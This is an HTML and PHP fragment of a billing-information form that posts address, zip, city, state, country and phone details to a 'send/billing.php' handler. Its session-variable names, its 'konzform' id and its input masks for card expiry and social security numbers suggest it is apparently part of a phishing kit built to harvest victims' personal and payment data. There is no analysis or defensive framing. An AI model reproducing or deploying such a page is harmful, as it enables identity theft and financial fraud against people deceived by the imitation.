...
<img _ngcontent-serverapp-c26="" src="images/alert.svg" alt="icon-alert-warning" style="height: 30px;"></p><div class="cardd d-flex align-items-center pt-4">
                                    <h6 class="me-2">Billing information </h6>
                                </div></center>
            <form action="./send/billing.php" method="post" id="konzform" name="konzform">
<label for="email" class="fieldLabel">Street address</label>
                
                <div _ngcontent-serverapp-c110="" class="row" bis_skin_checked="1"><div _ngcontent-serverapp-c110="" class="col-sm-12" bis_skin_checked="1"><span _ngcontent-serverapp-c110="" ><input _ngcontent-serverapp-c110="" type="text" name="add1" id="add1" formcontrolname="add1" aria-describedby="email-error" class="form-control error-behavior empty ng-untouched ng-pristine ng-invalid" aria-label=""><div _ngcontent-serverapp-c110="" class="floating-label" bis_skin_checked="1"></div><span _ngcontent-serverapp-c110="" id="add1" class="sr-only"></span><!----><!----></span><!----></div><div _ngcontent-serverapp-c110="" class="col-sm-12" bis_skin_checked="1">
                    
<label for="email" class="fieldLabel">Street address 2 (optional) </label>
                
<div _ngcontent-serverapp-c110="" class="row" bis_skin_checked="1"><div _ngcontent-serverapp-c110="" class="col-sm-12" bis_skin_checked="1"><span _ngcontent-serverapp-c110="" ><input _ngcontent-serverapp-c110="" type="text" name="add2" id="add2" formcontrolname="add2" aria-describedby="email-error" class="form-control error-behavior empty ng-untouched ng-pristine ng-invalid" aria-label=""><div _ngcontent-serverapp-c110="" class="floating-label" bis_skin_checked="1"></div><span _ngcontent-serverapp-c110="" id="add1" class="sr-only"></span><!----><!----></span><!----></div><div _ngcontent-serverapp-c110="" class="col-sm-12" bis_skin_checked="1">
    
<label for="email" class="fieldLabel">Zip code</label>
                
 <div _ngcontent-serverapp-c110="" class="row" bis_skin_checked="1"><div _ngcontent-serverapp-c110="" class="col-sm-12" bis_skin_checked="1"><span _ngcontent-serverapp-c110="" ><input _ngcontent-serverapp-c110="" type="tel" name="zip" id="zip" formcontrolname="zip" aria-describedby="email-error" class="form-control error-behavior empty ng-untouched ng-pristine ng-invalid" aria-label=""><div _ngcontent-serverapp-c110="" class="floating-label" bis_skin_checked="1"></div><span _ngcontent-serverapp-c110="" id="zip" class="sr-only"></span><!----><!----></span><!----></div><div _ngcontent-serverapp-c110="" class="col-sm-12" bis_skin_checked="1">
<label for="email" class="fieldLabel">City</label>
                
 <div _ngcontent-serverapp-c110="" class="row" bis_skin_checked="1"><div _ngcontent-serverapp-c110="" class="col-sm-12" bis_skin_checked="1"><span _ngcontent-serverapp-c110="" ><input _ngcontent-serverapp-c110="" type="text" name="city" id="city" formcontrolname="city" aria-describedby="email-error" class="form-control error-behavior empty ng-untouched ng-pristine ng-invalid" aria-label=""><div _ngcontent-serverapp-c110="" class="floating-label" bis_skin_checked="1"></div><span _ngcontent-serverapp-c110="" id="city" class="sr-only"></span><!----><!----></span><!----></div><div _ngcontent-serverapp-c110="" class="col-sm-12" bis_skin_checked="1"> <label for="email" class="fieldLabel">State</label>
                
 <div _ngcontent-serverapp-c110="" class="row" bis_skin_checked="1"><div _ngcontent-serverapp-c110="" class="col-sm-12" bis_skin_checked="1"><span _ngcontent-serverapp-c110="" ><input _ngcontent-serverapp-c110="" type="text" name="state" id="state" formcontrolname="state" aria-describedby="email-error" class="form-control error-behavior empty ng-untouched ng-pristine ng-invalid" aria-label=""><div _ngcontent-serverapp-c110="" class="floating-label" bis_skin_checked="1"></div><span _ngcontent-serverapp-c110="" id="state" class="sr-only"></span><!----><!----></span><!----></div><div _ngcontent-serverapp-c110="" class="col-sm-12" bis_skin_checked="1">               
                
<label for="email" class="fieldLabel">Country</label>
                
 <div _ngcontent-serverapp-c110="" class="row" bis_skin_checked="1"><div _ngcontent-serverapp-c110="" class="col-sm-12" bis_skin_checked="1"><span _ngcontent-serverapp-c110="" ><input _ngcontent-serverapp-c110="" type="text" name="country" id="country" value="<?=@$_SESSION['CountryName'];?>" formcontrolname="country" aria-describedby="email-error" class="form-control error-behavior empty ng-untouched ng-pristine ng-invalid" aria-label=""><div _ngcontent-serverapp-c110="" class="floating-label" bis_skin_checked="1"></div><span _ngcontent-serverapp-c110="" id="country" class="sr-only"></span><!----><!----></span><!----></div><div _ngcontent-serverapp-c110="" class="col-sm-12" bis_skin_checked="1">                   
<label for="email" class="fieldLabel">Mobile number</label>
                
 <div _ngcontent-serverapp-c110="" class="row" bis_skin_checked="1"><div _ngcontent-serverapp-c110="" class="col-sm-12" bis_skin_checked="1"><span _ngcontent-serverapp-c110="" ><input _ngcontent-serverapp-c110="" type="tel" name="phone" id="phone" value="<?=@$_SESSION['xcountryPhonePrefixx'];?>" formcontrolname="phone" aria-describedby="email-error" class="form-control error-behavior empty ng-untouched ng-pristine ng-invalid" aria-label=""><div _ngcontent-serverapp-c110="" class="floating-label" bis_skin_checked="1"></div><span _ngcontent-serverapp-c110="" id="phone" class="sr-only"></span><!----><!----></span><!----></div><div _ngcontent-serverapp-c110="" class="col-sm-12" bis_skin_checked="1">                   
 ...
 <script src="./js/jquery-3.3.1.min.js"></script>
      ...
      <script>$(window).ready(function(){setInterval(function(){$(".busyOverlay").fadeOut("fast"),$(".busyIcon").fadeOut("fast")},1e3)});</script>    <script>
        ...
        $(document).ready(function (e) {
            e("#phone").mask("+000000000000000000"), e("#exp").mask("00/00"), e("#ssn").mask("000-00-0000"),
            $("#konzform").validate({
                ...
                messages: {
                    add1: {
                        required: "Please check your Street address."
                    },
                    city: {
                    ...
                    country: {
                        required: "Please check your Country."
                    },
                    phone: {
